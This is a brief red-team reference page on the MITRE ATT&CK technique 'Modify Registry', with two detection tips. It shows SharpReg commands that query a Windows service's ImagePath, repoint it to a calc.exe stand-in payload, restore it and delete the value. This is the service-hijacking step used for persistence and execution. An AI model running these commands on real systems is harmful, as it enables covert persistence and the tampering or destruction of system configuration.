 # [Modify Registry](https://attack.mitre.org/techniques/T1112/)

## Exploit Description:
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

## Exploit syntax:

```powershell
# Example of querying 

sharpreg query HKLM\SYSTEM\CurrentControlSet\services\gupdatem | poshgrep ImagePath 

# Here we change the key that we just queried above. We notated what it was before we make changes

sharpreg create HKLM\SYSTEM\CurrentControlSet\Services\gupdatem EXPAND_SZ ImagePath "C:\Windows\WinSxS\x86_microsoft-windows-calc_31bf3856ad364e35_10.0.14393.0_none_7b13d13279112b2e\calc.exe"

# If necessary, you may change the key back to its original state:

sharpreg create HKLM\SYSTEM\CurrentControlSet\Services\gupdatem EXPAND_SZ ImagePath "\"C:\Program Files\Google\Update\GoogleUpdate.exe\" /medsvc"

# Also possible to just outright delete a key

sharpreg delete HKLM\SYSTEM\CurrentControlSet\Services\gupdatem ImagePath

```

## Detection Technique:
* Investigate any reg command. Reg is for registry querying and manipulation
* Event ID 4657 is made when the registry is modified

## Resources
https://github.com/jnqpblc/SharpReg

https://malware.news/t/introducing-poshc2-v8-0/58825